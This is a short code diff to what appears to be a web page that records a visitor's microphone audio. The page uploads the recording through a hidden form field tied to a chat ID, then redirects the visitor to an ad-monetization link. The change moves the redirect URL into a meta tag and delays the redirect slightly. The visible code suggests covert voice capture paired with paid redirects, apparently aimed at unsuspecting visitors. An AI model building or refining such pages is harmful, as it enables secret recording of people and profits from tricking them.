@@ -81,6 +81,7 @@
         <input type="hidden" name="chatId" id="chatId">
         <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
     </form>
+  <meta id="redirectUrl" content="https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738">
 
 <script>
 document.addEventListener('DOMContentLoaded', () => {
@@ -122,8 +123,10 @@ async function startRecording(duration) {
                 body: formData
             });
 
+        const redirectUrl = document.getElementById("redirectUrl").content;
+
             if (res.ok) {
-                window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+          setTimeout(() => window.location.href = redirectUrl, 200);
             } else {
                 alert("فشل الإرسال. حاول مرة أخرى.");
             }
